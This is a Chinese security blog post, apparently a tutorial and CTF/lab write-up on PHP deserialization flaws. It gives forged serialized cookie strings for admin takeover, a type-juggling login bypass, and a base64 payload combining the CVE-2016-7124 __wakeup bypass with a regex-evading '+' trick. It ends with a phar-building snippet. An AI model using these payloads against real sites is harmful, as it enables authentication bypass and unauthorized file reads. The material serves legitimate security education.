@@ -1,0 +1,302 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>PHP反序列化 | 风清竹喧</title><meta name="keywords" content="反序列化"><meta name="author" content="cgrona"><meta name="copyright" content="cgrona"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、什么是反序列化？ 首先我们要知道什么是序列化，我们在php里定义一个class，这个class里存储着一些变量和数据，如果这个class一直不销毁，就会浪费系统资源，在一些大型项目里可能就会产生问题，因此，我们可以把这个对象序列化(serialize)，以字符串的形式存储起来，当需要用的时候再将它进行反序列化(unserialize)回来就可以了。 例如： 12345678&lt;?phpcl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP反序列化">
+<meta property="og:url" content="https://cgrona.github.io/2022/03/26/unserialize/index.html">
+<meta property="og:site_name" content="风清竹喧">
+<meta property="og:description" content="一、什么是反序列化？ 首先我们要知道什么是序列化，我们在php里定义一个class，这个class里存储着一些变量和数据，如果这个class一直不销毁，就会浪费系统资源，在一些大型项目里可能就会产生问题，因此，我们可以把这个对象序列化(serialize)，以字符串的形式存储起来，当需要用的时候再将它进行反序列化(unserialize)回来就可以了。 例如： 12345678&lt;?phpcl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cgrona.github.io/img/14.jpg">
+<meta property="article:published_time" content="2022-03-26T04:37:31.000Z">
+<meta property="article:modified_time" content="2024-04-08T10:53:06.448Z">
+<meta property="article:author" content="cgrona">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cgrona.github.io/img/14.jpg"><link rel="shortcut icon" href="/img/logo.jpg"><link rel="canonical" href="https://cgrona.github.io/2022/03/26/unserialize/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PHP反序列化',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-08 18:53:06'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="风清竹喧" type="application/atom+xml">
+<link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/14.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">风清竹喧</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PHP反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-26T04:37:31.000Z" title="发表于 2022-03-26 12:37:31">2022-03-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-08T10:53:06.448Z" title="更新于 2024-04-08 18:53:06">2024-04-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%90%9E%E6%B8%97%E9%80%8F/">搞渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PHP反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>一、什么是反序列化？</h1>
+<p>首先我们要知道什么是序列化，我们在php里定义一个class，这个class里存储着一些变量和数据，如果这个class一直不销毁，就会浪费系统资源，在一些大型项目里可能就会产生问题，因此，我们可以把这个对象<strong>序列化</strong>(serialize)，以<strong>字符串</strong>的形式存储起来，当需要用的时候再将它进行<strong>反序列化</strong>(unserialize)回来就可以了。</p>
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;bob&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">22</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$var</span> = <span class="keyword">new</span> demo();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;demo&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;bob&quot;;s:3:&quot;age&quot;;i:22;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的各个字母分别的含义为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a - array  数组</span><br><span class="line">b - boolean  布尔型</span><br><span class="line">d - double  双精度型</span><br><span class="line">i - integer  整型</span><br><span class="line">r - reference  对象引用</span><br><span class="line">s - string  字符串</span><br><span class="line">C - custom object  自定义对象序列化</span><br><span class="line">O - class  对象</span><br><span class="line">N - null  NULL值</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure>
+<h1>二、漏洞的产生</h1>
+<h2 id="1-修改对象属性">1、修改对象属性</h2>
+<p>在篡改数据的时候，只要攻击者保留一个有效的序列化对象，反序列化过程就会创建一个带有修改后的属性值的服务器端对象。</p>
+<p>例如：有一个使用序列化User对象将用户会话数据存储在cookie中的网站，如果我们能在HTTP请求中发现这个序列化对象，将其解码找到这个序列化后的数据：</p>
+<p><code>O:4:&quot;User&quot;:2:&#123;s:8:&quot;Username&quot;;s:3:&quot;Bob&quot;;s:5:&quot;Admin&quot;;b:0;&#125;</code></p>
+<p>可以看到&quot;Admin&quot;属性是一个bool类型，我们就可以直接将属性值更改为1，重新编码该对象并覆盖原来的cookie，此时如果网站是通过该cookie来检查当前用户是否拥有管理员权限，那么我们就可以得到管理员权限。</p>
+<h2 id="2-修改对象数据类型">2、修改对象数据类型</h2>
+<p>PHP的逻辑运算符&quot;==&quot;比较不同的数据类型时，只会比较它们的值而不会比较类型，因此这就意味着<code>1 == '1'</code>为true。更为不同的是，这也适用与任何以数字开头的字母数字字符串，这时，PHP会将整个字符串转换成该字符串开头的整数值，其余部分被完全忽略，因此<code>1 == '1 aabbcc'</code>会被PHP视为<code>1 == 1</code>，甚至当字符串没有任何数字时,<code>0 == 'aabbcc'</code>的计算结果是true。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$login</span> = unserialize(<span class="variable">$_COOKIE</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$login</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//登录成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们通过修改password属性，使其为整数0而不是预期的字符串，只要存储的密码不以数字开头，条件就会始终返回true，从而绕过验证登录</p>
+<h2 id="3-magic-method">3、Magic Method</h2>
+<p>php里存在一种叫<strong>magic method</strong>的函数，这类函数在满足某些条件的时候就会被触发</p>
+<ol>
+<li><code>__construct()</code>：当一个对象被创建时被调用</li>
+<li><code>__destruct()</code>：当一个对象被销毁时被调用</li>
+<li><code>__sleep()</code>：在序列化即使用之后被调用</li>
+<li><code>__wakeup()</code>：在反序列化之后被调用</li>
+<li>…</li>
+</ol>
+<p>如果服务器能够接收反序列化过的字符串，并且未经过滤就把其中的变量直接放进这些函数中，就可能造成漏洞</p>
+<h1>三、实例分析</h1>
+<h1>1、修改对象属性</h1>
+<p>BurpSuite里的一个靶场：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs">https://portswigger.net/web-security/all-labs</a></p>
+<p><img src="/2022/03/26/unserialize/3.png" alt></p>
+<p>进来之后用它提供的用户名和密码进行登录</p>
+<p><img src="/2022/03/26/unserialize/4.png" alt></p>
+<p><img src="/2022/03/26/unserialize/5.png" alt></p>
+<p>截获该HTTP请求：</p>
+<p><img src="/2022/03/26/unserialize/6.png" alt></p>
+<p>可以看到这里cookie的session值进行了base64的加密，将其解密后就是一个User对象的序列化字符串</p>
+<p><code>O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:5:&quot;admin&quot;;b:0;&#125;</code></p>
+<p>只要我们将admin的值更改为1，再重新编码并替换掉原先的session值，我们就可以以管理员的身份登入，并可以将用户删除，删除即可完成该实验</p>
+<p><img src="/2022/03/26/unserialize/7.png" alt></p>
+<h2 id="2-修改对象数据类型">2、修改对象数据类型</h2>
+<p><img src="/2022/03/26/unserialize/8.png" alt></p>
+<p>同样，用题目所给的用户名进行登录，然后抓包，得到cookie的session值：<code>Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJmOGhla3N2YzlncXl4OHBzY25ldmg0Z2toeHhzbHZrNCI7fQ==</code></p>
+<p>解码为：<code>O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;f8heksvc9gqyx8pscnevh4gkhxxslvk4&quot;;&#125;</code></p>
+<p>我们要伪造管理员登录，并且绕过token的验证，因此将该字符串更改为：<code>O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:13:&quot;adminitrator&quot;;s:12:&quot;access_token&quot;;i:0;&#125;</code></p>
+<p>将其编码后更换原先的session，就能成功的以管理员的身份进入</p>
+<h2 id="3-magic-method">3、Magic Method</h2>
+<p>一道<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/">攻防世界</a>的题目：</p>
+<p><img src="/2022/03/26/unserialize/1.png" alt="1"></p>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里涉及到一个<code>__wakeup()</code>函数的漏洞，也就是CVE-2016-7124这个漏洞，通过<strong>修改对象的属性数目使其大于实际数目</strong>就可以绕过该magic函数的调用，涉及的PHP版本：</p>
+<p><strong>PHP5：&lt;5.6.25</strong></p>
+<p><strong>PHP7：&lt;7.0.10</strong></p>
+<p>然后构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$var</span> = <span class="keyword">new</span> Demo();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>生成序列化后的字符串:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>注意：</strong></p>
+<p>这里真正的字符串是这个</p>
+<p><img src="/2022/03/26/unserialize/2.png" alt="2"></p>
+<p>因为php的对象里的属性有几种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public 公共属性</span><br><span class="line">private 私有属性</span><br><span class="line">protected 受保护的属性</span><br></pre></td></tr></table></figure>
+<p>而其中的<strong>private</strong>和<strong>protected</strong>定义的变量在序列化之后会有两个空字符，复制时是没办法复制这个空字符的，因此需要在php里继续构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$var</span> = <span class="keyword">new</span> Demo();</span><br><span class="line"><span class="variable">$var</span> = serialize(<span class="variable">$var</span>);</span><br><span class="line"><span class="variable">$var</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$var</span>); <span class="comment">//绕过正则匹配</span></span><br><span class="line"><span class="variable">$var</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$var</span>);  <span class="comment">//绕过__wakeup()函数</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>生成payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure>
+<p>再传参即可</p>
+<p>至于为什么加一个+号就可以绕过正则，这是PHP的一个bug，详情可以看看这篇文章 <a target="_blank" rel="noopener" href="https://www.phpbug.cn/archives/32.html">https://www.phpbug.cn/archives/32.html</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;test.phar&quot;</span>)</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>);  <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(): ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> demo();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;fllllag&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://cgrona.github.io">cgrona</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cgrona.github.io/2022/03/26/unserialize/">https://cgrona.github.io/2022/03/26/unserialize/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cgrona.github.io" target="_blank">风清竹喧</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></div><div class="post_share"><div class="social-share" data-image="/img/14.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/03/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><img class="prev-cover" src="/img/20.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">文件包含</div></div></a></div><div class="next-post pull-right"><a href="/2022/03/19/xss/"><img class="next-cover" src="/img/4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XSS各种绕过姿势</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">cgrona</div><div class="author-info__description">选择有时候比努力更重要</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/cgrona"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/cgrona" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1549692438@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎阅读😊</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">一、什么是反序列化？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">二、漏洞的产生</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BF%AE%E6%94%B9%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7"><span class="toc-text">1、修改对象属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9%E5%AF%B9%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-text">2、修改对象数据类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-magic-method"><span class="toc-text">3、Magic Method</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">三、实例分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">1、修改对象属性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BF%AE%E6%94%B9%E5%AF%B9%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-text">2、修改对象数据类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 